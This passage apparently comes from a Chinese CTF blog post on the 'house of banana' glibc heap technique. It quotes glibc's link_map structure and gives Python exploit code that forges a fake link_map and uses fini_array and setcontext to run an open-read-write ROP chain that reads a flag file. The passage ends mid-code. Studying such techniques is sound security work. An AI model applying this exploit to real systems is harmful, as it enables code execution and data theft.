class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 定义在 elf/elf.h:878 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>DT_FINI_ARRAY26<span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>DT_FINI_ARRAYSZ28<span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义在 include/link.h: 82 */</span></span><br><span class="line"><span class="comment">/* Structure describing a loaded shared object.  The `l_next&#x27; and `l_prev&#x27;</span></span><br><span class="line"><span class="comment">   members form a chain of all the shared objects loaded at startup.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   These data structures exist in space used by the run-time dynamic linker;</span></span><br><span class="line"><span class="comment">   modifying them may have disastrous results.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This data structure might change in future, if necessary.  User-level</span></span><br><span class="line"><span class="comment">   programs must avoid defining objects of this type.  */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> *l_phdr;<span class="comment">/* Pointer to program header table in core.  */</span></span><br><span class="line">    ElfW(Addr) l_entry;<span class="comment">/* Entry point location.  */</span></span><br><span class="line">    ElfW(Half) l_phnum;<span class="comment">/* Number of program header entries.  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;<span class="comment">/* Number of dynamic segment entries.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array of DT_NEEDED dependencies and their dependencies, in</span></span><br><span class="line"><span class="comment">       dependency order for symbol lookup (with and without</span></span><br><span class="line"><span class="comment">       duplicates).  There is no entry before the dependencies have</span></span><br><span class="line"><span class="comment">       been loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need a special searchlist to process objects marked with</span></span><br><span class="line"><span class="comment">       DT_SYMBOLIC.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dependent object that first caused this object to be loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array with version names.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_nversions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Symbol hash table.  */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_direct_opencount; <span class="comment">/* Reference count for dlopen/dlclose.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span>/* <span class="title">Where</span> <span class="title">this</span> <span class="title">object</span> <span class="title">came</span> <span class="title">from</span>.  */</span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">lt_executable,<span class="comment">/* The main executable program.  */</span></span><br><span class="line">lt_library,<span class="comment">/* Library needed by main executable.  */</span></span><br><span class="line">lt_loaded<span class="comment">/* Extra run-time loaded shared object.  */</span></span><br><span class="line">      &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_relocated:<span class="number">1</span>;<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_global:<span class="number">1</span>;<span class="comment">/* Nonzero if object in _dl_global_scope.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_reserved:<span class="number">2</span>;<span class="comment">/* Reserved for internal use.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_phdr_allocated:<span class="number">1</span>; <span class="comment">/* Nonzero if the data structure pointed</span></span><br><span class="line"><span class="comment">to by `l_phdr&#x27; is allocated.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_soname_added:<span class="number">1</span>; <span class="comment">/* Nonzero if the SONAME is for sure in</span></span><br><span class="line"><span class="comment">      the l_libname list.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_faked:<span class="number">1</span>;<span class="comment">/* Nonzero if this is a faked descriptor</span></span><br><span class="line"><span class="comment">   without associated file.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_need_tls_init:<span class="number">1</span>; <span class="comment">/* Nonzero if GL(dl_init_static_tls)</span></span><br><span class="line"><span class="comment">       should be called on this link map</span></span><br><span class="line"><span class="comment">       when relocation finishes.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_auditing:<span class="number">1</span>;<span class="comment">/* Nonzero if the DSO is used in auditing.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_audit_any_plt:<span class="number">1</span>; <span class="comment">/* Nonzero if at least one audit module</span></span><br><span class="line"><span class="comment">       is interested in the PLT interception.*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_removed:<span class="number">1</span>;<span class="comment">/* Nozero if the object cannot be used anymore</span></span><br><span class="line"><span class="comment">   since it is removed.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_contiguous:<span class="number">1</span>; <span class="comment">/* Nonzero if inter-segment holes are</span></span><br><span class="line"><span class="comment">    mprotected or if no holes are present at</span></span><br><span class="line"><span class="comment">    all.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_symbolic_in_local_scope:<span class="number">1</span>; <span class="comment">/* Nonzero if l_local_scope</span></span><br><span class="line"><span class="comment"> during LD_TRACE_PRELINKING=1</span></span><br><span class="line"><span class="comment"> contains any DT_SYMBOLIC</span></span><br><span class="line"><span class="comment"> libraries.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_free_initfini:<span class="number">1</span>; <span class="comment">/* Nonzero if l_initfini can be</span></span><br><span class="line"><span class="comment">       freed, ie. not allocated with</span></span><br><span class="line"><span class="comment">       the dummy malloc in ld.so.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* NODELETE status of the map.  Only valid for maps of type</span></span><br><span class="line"><span class="comment">       lt_loaded.  Lazy binding sets l_nodelete_active directly,</span></span><br><span class="line"><span class="comment">       potentially from signal handlers.  Initial loading of an</span></span><br><span class="line"><span class="comment">       DF_1_NODELETE object set l_nodelete_pending.  Relocation may</span></span><br><span class="line"><span class="comment">       set l_nodelete_pending as well.  l_nodelete_pending maps are</span></span><br><span class="line"><span class="comment">       promoted to l_nodelete_active status in the final stages of</span></span><br><span class="line"><span class="comment">       dlopen, prior to calling ELF constructors.  dlclose only</span></span><br><span class="line"><span class="comment">       refuses to unload l_nodelete_active maps, the pending status is</span></span><br><span class="line"><span class="comment">       ignored.  */</span></span><br><span class="line">    <span class="type">bool</span> l_nodelete_active;</span><br><span class="line">    <span class="type">bool</span> l_nodelete_pending;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;link_map.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected information about own RPATH directories.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_rpath_dirs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected results of relocation while profiling.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reloc_result</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      DL_FIXUP_VALUE_TYPE addr;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">bound</span>;</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> boundndx;</span><br><span class="line">      <span class="type">uint32_t</span> enterexit;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">      <span class="comment">/* CONCURRENCY <span class="doctag">NOTE:</span> This is used to guard the concurrent initialization</span></span><br><span class="line"><span class="comment"> of the relocation result across multiple threads.  See the more</span></span><br><span class="line"><span class="comment"> detailed notes in elf/dl-runtime.c.  */</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> init;</span><br><span class="line">    &#125; *l_reloc_result;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pointer to the version information if available.  */</span></span><br><span class="line">    ElfW(Versym) *l_versyms;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* String specifying the path where this object was found.  */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *l_origin;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Start and finish of memory map for this object.  l_map_start</span></span><br><span class="line"><span class="comment">       need not be the same as l_addr.  */</span></span><br><span class="line">    ElfW(Addr) l_map_start, l_map_end;</span><br><span class="line">    <span class="comment">/* End of the executable part of the mapping.  */</span></span><br><span class="line">    ElfW(Addr) l_text_end;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Default array for &#x27;l_scope&#x27;.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_scope_mem</span>[4];</span></span><br><span class="line">    <span class="comment">/* Size of array allocated for &#x27;l_scope&#x27;.  */</span></span><br><span class="line">    <span class="type">size_t</span> l_scope_max;</span><br><span class="line">    <span class="comment">/* This is an array defining the lookup scope for this link map.</span></span><br><span class="line"><span class="comment">       There are initially at most three different scope lists.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> **<span class="title">l_scope</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* A similar array, this time only with the local scope.  This is</span></span><br><span class="line"><span class="comment">       used occasionally.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_local_scope</span>[2];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This information is kept to check for sure whether a shared</span></span><br><span class="line"><span class="comment">       object is the same as one already loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_file_id</span> <span class="title">l_file_id</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected information about own RUNPATH directories.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_runpath_dirs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* List of object in order of the init and fini calls.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> **<span class="title">l_initfini</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* List of the dependencies introduced through symbol binding.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_reldeps</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> act;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">list</span>[];</span></span><br><span class="line">      &#125; *l_reldeps;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_reldepsmax;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Nonzero if the DSO is used.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_used;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Various flag words.  */</span></span><br><span class="line">    ElfW(Word) l_feature_1;</span><br><span class="line">    ElfW(Word) l_flags_1;</span><br><span class="line">    ElfW(Word) l_flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Temporarily used in `dl_close&#x27;.  */</span></span><br><span class="line">    <span class="type">int</span> l_idx;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_machine</span> <span class="title">l_mach</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym;</span><br><span class="line">      <span class="type">int</span> type_class;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">value</span>;</span></span><br><span class="line">      <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *ret;</span><br><span class="line">    &#125; l_lookup_cache;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Thread-local storage related info.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Start of the initialization image.  */</span></span><br><span class="line">    <span class="type">void</span> *l_tls_initimage;</span><br><span class="line">    <span class="comment">/* Size of the initialization image.  */</span></span><br><span class="line">    <span class="type">size_t</span> l_tls_initimage_size;</span><br><span class="line">    <span class="comment">/* Size of the TLS block.  */</span></span><br><span class="line">    <span class="type">size_t</span> l_tls_blocksize;</span><br><span class="line">    <span class="comment">/* Alignment requirement of the TLS block.  */</span></span><br><span class="line">    <span class="type">size_t</span> l_tls_align;</span><br><span class="line">    <span class="comment">/* Offset of first byte module alignment.  */</span></span><br><span class="line">    <span class="type">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NO_TLS_OFFSET</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> NO_TLS_OFFSET0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FORCED_DYNAMIC_TLS_OFFSET</span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> NO_TLS_OFFSET == 0</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -1</span></span><br><span class="line"><span class="meta"># <span class="keyword">elif</span> NO_TLS_OFFSET == -1</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -2</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">error</span> <span class="string">&quot;FORCED_DYNAMIC_TLS_OFFSET is not defined&quot;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* For objects present at startup time: offset in the static TLS block.  */</span></span><br><span class="line">    <span class="type">ptrdiff_t</span> l_tls_offset;</span><br><span class="line">    <span class="comment">/* Index of the module in the dtv array.  */</span></span><br><span class="line">    <span class="type">size_t</span> l_tls_modid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of thread_local objects constructed by this DSO.  This is</span></span><br><span class="line"><span class="comment">       atomically accessed and modified and is not always protected by the load</span></span><br><span class="line"><span class="comment">       lock.  See also: CONCURRENCY NOTES in cxa_thread_atexit_impl.c.  */</span></span><br><span class="line">    <span class="type">size_t</span> l_tls_dtor_count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Information used to change permission after the relocations are</span></span><br><span class="line"><span class="comment">       done.  */</span></span><br><span class="line">    ElfW(Addr) l_relro_addr;</span><br><span class="line">    <span class="type">size_t</span> l_relro_size;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> l_serial;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></p><p>  那么，结合上述定义，我们很容易伪造一个包含有orw的rop的<strong>link_map</strong>，如下所示<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#house of banana</span></span><br><span class="line">fake_link_map_addr = chunk_base + <span class="number">0x000055de23bed370</span> - <span class="number">0x55de23bec000</span></span><br><span class="line">flag_address = fake_link_map_addr + <span class="number">100</span> * <span class="number">8</span></span><br><span class="line">stack_address = fake_link_map_addr + <span class="number">0x10</span></span><br><span class="line">pop_rdi_ret = lib_base + <span class="number">0x26b72</span></span><br><span class="line">ret = pop_rdi_ret + <span class="number">1</span></span><br><span class="line">pop_rsi_ret = lib_base + <span class="number">0x27529</span></span><br><span class="line">pop_rdx_r12_ret = lib_base + <span class="number">0x11c36f</span></span><br><span class="line">syscall_ret = lib_base + <span class="number">0x66229</span></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += up64(pop_rdi_ret) + up64(flag_address)</span><br><span class="line">rop += up64(pop_rsi_ret) + up64(<span class="number">4</span>)</span><br><span class="line">rop += up64(lib_base + lib.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += up64(pop_rdi_ret) + up64(<span class="number">3</span>)</span><br><span class="line">rop += up64(pop_rsi_ret) + up64(flag_address)</span><br><span class="line">rop += up64(pop_rdx_r12_ret) + up64(<span class="number">14</span> * <span class="number">8</span>) + up64(<span class="number">0</span>)</span><br><span class="line">rop += up64(lib_base + lib.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += up64(pop_rdi_ret) + up64(<span class="number">1</span>)</span><br><span class="line">rop += up64(pop_rsi_ret) + up64(flag_address)</span><br><span class="line">rop += up64(pop_rdx_r12_ret) + up64(<span class="number">14</span> * <span class="number">8</span>) + up64(<span class="number">0</span>)</span><br><span class="line">rop += up64(lib_base + lib.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">rop += up64(lib_base + lib.sym[<span class="string">&#x27;exit&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">link_map &#123;</span></span><br><span class="line"><span class="string">l_addr = 0offset: 0 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">l_next = (char*)fake_link_map_addr + 7 * 8 - 3 * 8offset: 3 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">l_real = &amp;link_mapoffset: 5 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fake_l_next_2:offset: 7 * 8</span></span><br><span class="line"><span class="string">(char*)fake_link_map_addr + 8 * 8 - 3 * 8</span></span><br><span class="line"><span class="string">fake_l_next_3:offset: 8 * 8</span></span><br><span class="line"><span class="string">(char*)fake_link_map_addr + 13 * 8 - 3 * 8</span></span><br><span class="line"><span class="string">fake_l_real_2:offset: 9 * 8</span></span><br><span class="line"><span class="string">(char*)fake_link_map_addr + 7 * 8 - 3 * 8</span></span><br><span class="line"><span class="string">fake_l_real_3:offset: 10 * 8</span></span><br><span class="line"><span class="string">(char*)fake_link_map_addr + 8 * 8 - 3 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fake_l_next_4:offset: 13 * 8</span></span><br><span class="line"><span class="string">null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fake_l_real_4:offset: 15 * 8</span></span><br><span class="line"><span class="string">(char*)fake_link_map_addr + 13 * 8 - 3 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">l_info[26]offset: 34 * 8</span></span><br><span class="line"><span class="string">(char*)&amp;link_map + 37 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">l_info[28]offset: 36 * 8</span></span><br><span class="line"><span class="string">(char*)&amp;link_map + 39 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fini_array:offset: 38 * 8</span></span><br><span class="line"><span class="string">(char*)&amp;link_map + 52 * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fini_arraysize:offset: 40 * 8</span></span><br><span class="line"><span class="string">8 * 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fini_array:offset: 52 * 8</span></span><br><span class="line"><span class="string">lib_base + lib.sym[&#x27;setcontext&#x27;] + 61</span></span><br><span class="line"><span class="string">lib_base + ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">setcontext_rdi:offset: 66 * 8</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">setcontext_rsi:offset: 67 * 8</span></span><br><span class="line"><span class="string">stack_address</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">setcontext_rdx:offset: 70 * 8</span></span><br><span class="line"><span class="string">len(rop)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">setcontext_stack:offset: 73 * 8</span></span><br><span class="line"><span class="string">stack_address</span></span><br><span class="line"><span class="string">setcontext_retn:offset: 74 * 8</span></span><br><span class="line"><span class="string">lib_base + lib.sym[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">l_init_called = 0x800000000offset: 99 * 8</span></span><br><span class="line"><span class="string">flag:offset: 100 * 8</span></span><br><span class="line"><span class="string">&#x27;flag\x00&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">fake_link_map = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">3</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">7</span> * <span class="number">8</span> - <span class="number">3</span> * <span class="number">8</span>)<span class="comment">#l_next</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">5</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(fake_link_map_addr)<span class="comment">#l_real</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">7</span> * <span 